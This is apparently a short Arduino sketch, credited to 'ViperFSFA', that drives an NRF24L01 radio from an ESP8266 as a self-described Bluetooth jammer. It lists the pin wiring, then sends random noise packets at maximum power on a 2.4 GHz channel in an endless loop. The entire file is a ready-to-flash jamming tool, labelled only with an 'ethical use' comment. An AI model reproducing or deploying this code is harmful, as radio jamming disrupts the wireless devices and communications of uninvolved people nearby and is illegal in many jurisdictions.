
//NRF24L01 + ESP8266
//VCC  3.3V
//GND GND
//CE  D1 (GPIO5)
//CSN D2 (GPIO4)
//SCK D5 (GPIO14)
//MOSI  D7 (GPIO13)
//MISO  D6 (GPIO12)

// A code created by ViperFSFA, ONLY FOR ETHICAL USE
// #HackThePlanet

#include <SPI.h>
#include <nRF24L01.h>
#include <RF24.h>

RF24 radio(5, 4); // CE=D1 (GPIO5), CSN=D2 (GPIO4)

void setup() {
  Serial.begin(115200);
  radio.begin();
  radio.setAutoAck(false);
  radio.setDataRate(RF24_2MBPS);
  radio.setPALevel(RF24_PA_MAX);
  radio.setChannel(40); 
  radio.stopListening();
  Serial.println("ESP8266 Bluetooth Jammer Active!");
}

void loop() {
  uint8_t noise[32];
  for (int i = 0; i < 32; i++) {
    noise[i] = random(256);
  }
  radio.write(&noise, sizeof(noise));
  delayMicroseconds(100);
}
